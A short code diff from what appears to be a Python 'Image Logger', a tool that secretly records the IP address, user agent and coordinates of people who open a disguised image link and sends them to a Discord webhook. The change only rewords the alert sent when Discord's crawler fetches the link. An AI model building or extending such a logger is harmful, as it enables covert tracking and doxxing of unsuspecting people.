@@ -99,9 +99,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "link has been cached by discord - ip should appear soon.",
             "color": config["color"],
-            "description": f"*soon*...\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"*soon*...\n\n**Endpoint:** `{endpoint}`\n**Bot IP:** `{ip}`\n**Platform:** `{bot}`\n (This is just discord not a real IP.)",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
